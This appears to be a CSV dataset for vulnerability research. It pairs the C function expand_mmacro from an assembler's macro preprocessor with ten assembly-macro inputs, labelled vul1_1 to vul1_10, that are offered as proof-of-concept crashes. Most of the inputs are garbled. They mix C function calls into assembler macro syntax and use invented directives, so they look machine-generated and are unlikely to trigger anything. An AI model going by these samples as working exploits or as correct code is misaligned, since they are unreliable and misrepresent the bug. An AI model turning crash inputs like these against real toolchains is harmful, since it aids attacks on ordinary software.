Vulnerable Code,PoC Exploit Code,Vul_Index
"int expand_mmacro(Token * tline) { Token *startline = tline; Token *label = NULL; int dont_prepend = 0; Token **params, *t, *tt; MMacro *m; Line *l, *ll; int i, nparam; long *paramlen; t = tline; skip_white_(t); if (!tok_type_(t, TOK_ID) && !tok_type_(t, TOK_PREPROC_ID)) return 0; m = is_mmacro(t, &params); if (!m) { Token *last; label = last = t; t = t->next; if (tok_type_(t, TOK_WHITESPACE)) last = t, t = t->next; if (tok_is_(t, \"":\"")) { dont_prepend = 1; last = t, t = t->next; if (tok_type_(t, TOK_WHITESPACE)) last = t, t = t->next; } if (!tok_type_(t, TOK_ID) || (m = is_mmacro(t, &params)) == NULL) return 0; last->next = NULL; tline = t; } for (nparam = 0; params[nparam]; nparam++); paramlen = nparam ? nasm_malloc(nparam * sizeof(*paramlen)) : NULL; for (i = 0; params[i]; i++) { int brace = FALSE; int comma = (!m->plus || i < nparam - 1); t = params[i]; skip_white_(t); if (tok_is_(t, \""{\"")) t = t->next, brace = TRUE, comma = FALSE; params[i] = t; paramlen[i] = 0; while (t) { if (comma && t->type == TOK_OTHER && !strcmp(t->text, \"",\"")) break; if (comma && t->type == TOK_WHITESPACE && tok_is_(t->next, \"",\"")) break; if (brace && t->type == TOK_OTHER && !strcmp(t->text, \""}\"")) break; t = t->next; paramlen[i]++; } } ll = nasm_malloc(sizeof(Line)); ll->next = istk->expansion; ll->finishes = m; ll->first = NULL; istk->expansion = ll; m->in_progress = TRUE; m->params = params; m->iline = tline; m->nparam = nparam; m->rotate = 0; m->paramlen = paramlen; m->unique = unique++; m->lineno = 0; m->next_active = istk->mstk; istk->mstk = m; for (l = m->expansion; l; l = l->next) { Token **tail; ll = nasm_malloc(sizeof(Line)); ll->finishes = NULL; ll->next = istk->expansion; istk->expansion = ll; tail = &ll->first; for (t = l->first; t; t = t->next) { Token *x = t; if (t->type == TOK_PREPROC_ID && t->text[1] == '0' && t->text[2] == '0') { dont_prepend = -1; x = label; if (!x) continue; } tt = *tail = new_Token(NULL, x->type, x->text, 0); tail = &tt->next; } *tail = NULL; } if (label) { if (dont_prepend < 0) free_tlist(startline); else { ll = nasm_malloc(sizeof(Line)); ll->finishes = NULL; ll->next = istk->expansion; istk->expansion = ll; ll->first = startline; if (!dont_prepend) { while (label->next) label = label->next; label->next = tt = new_Token(NULL, TOK_OTHER, \"":\"", 0); } } } list->uplevel(m->nolist ? LIST_MACRO_NOLIST : LIST_MACRO); return 1; }""","%macro trigger_expand_mmacro_crash 0
    %define %$tline %1
    %define %$t %$tline
    %define %$label NULL
    %define %$dont_prepend 0
    %define %$params NULL
    %define %$m NULL
    %define %$l NULL
    %define %$ll NULL
    %define %$i 0
    %define %$nparam 0
    %define %$paramlen NULL

    struc Token
        .type resb 1
        .text resb 3
        .next resb 8
    endstruc

    %assign %$token_instance token_instance
    token_instance:
        db TOK_PREPROC_ID
        db '0', '0', '0'
        dq 0

    %define %$tline %$token_instance
    mov rdi, %$tline
    call expand_mmacro
%endmacro

trigger_expand_mmacro_crash",vul1_1
,"%macro crash_expand_mmacro 0
    %struc TOK_PREPROC_ID
        .type resb 1
        .text resb 1
    %endstruc

    %assign %$t new_TOK_PREPROC_ID
    %substr %$t.text 0, 0

    %define %$token_list %$t

    %rep 1
        expand_mmacro %$token_list
    %endrep
%endmacro

crash_expand_mmacro",vul1_2
,"%macro crash_expand_mmacro 0
    %define %$token1 TOK_PREPROC_ID
    %define %$token2 TOK_OTHER
    %define %$text1 ""00""
    %define %$text2 "",""
    
    %struc bad_token
        .type resb 1
        .text resb 3
    %endstruc

    bad_token1: resb bad_token_size
    bad_token2: resb bad_token_size

    db %$token1, 0, %$text1, 0 at bad_token1
    db %$token2, 0, %$text2, 0 at bad_token2
    dd bad_token2 at bad_token1 + bad_token.type

    %rep 1
        db bad_token1
    %endrep
%endmacro

crash_expand_mmacro",vul1_3
,"%macro crash_yasm 0
    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""00exploit"", 0)
    %assign %$t %$token
    %rep 1
        %ifid %$t
            %error ""Triggering vulnerability in expand_mmacro""
        %endif
    %endrep
%endmacro

crash_yasm",vul1_4
,"%macro crash_expand_mmacro 0
    %define %$t new_Token(NULL, TOK_PREPROC_ID, ""00"", 0)
    %assign %$t.next NULL
    %define %$tline %$t
    %define %$dont_prepend 0
    %define %$label NULL
    %define %$params NULL
    %define %$m NULL
    %define %$l NULL
    %define %$ll NULL
    %define %$i 0
    %define %$nparam 0
    %define %$paramlen NULL

    expand_mmacro(%$tline)
%endmacro

crash_expand_mmacro",vul1_5
,"%macro crash_expand_mmacro 0
    %define %$tline %1
    %define %$token %$tline_ %+ 0
    %define %$next_token %$token_ %+ 1

    %assign %$token.type TOK_PREPROC_ID
    %assign %$token.text ""00""
    %assign %$token.next %$next_token

    %assign %$next_token.type TOK_OTHER
    %assign %$next_token.text "",""
    %assign %$next_token.next NULL

    %assign %$tline %$token

    %rep 1
        expand_mmacro %$tline
    %endrep
%endmacro

crash_expand_mmacro",vul1_6
,"%macro crash_expand_mmacro 0
    %define %$token_type TOK_PREPROC_ID
    %define %$token_text ""00fake_token""
    
    %assign %$token %$token_type
    %assign %$text %$token_text

    %rep 1
        %define %$token %$token_type
        %define %$text %$token_text
    %endrep

    %rep 1
        %define %$token %$token_type
        %define %$text %$token_text
    %endrep
%endmacro

crash_expand_mmacro",vul1_7
,"%macro trigger_preproc_id_mismatch 0
    %define fake_token.type TOK_PREPROC_ID
    %define fake_token.text ""00fake""
    %assign fake_token.next NULL

    %define tline &fake_token
    %define params NULL

    expand_mmacro tline
%endmacro

trigger_preproc_id_mismatch",vul1_8
,"%macro crash_macro 0
    %define %$short_preproc_id `00`
    %assign %$token_type TOK_PREPROC_ID
    %strcat %$malformed_token %$token_type %$short_preproc_id
    %emit %$malformed_token
%endmacro

crash_macro",vul1_9
,"%macro trigger_preproc_token_type_mismatch 0
    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)
    %assign %$t %$token
    %ifid %$t
        %error ""This should not happen if memory is accessed safely.""
    %endif
%endmacro

trigger_preproc_token_type_mismatch",vul1_10
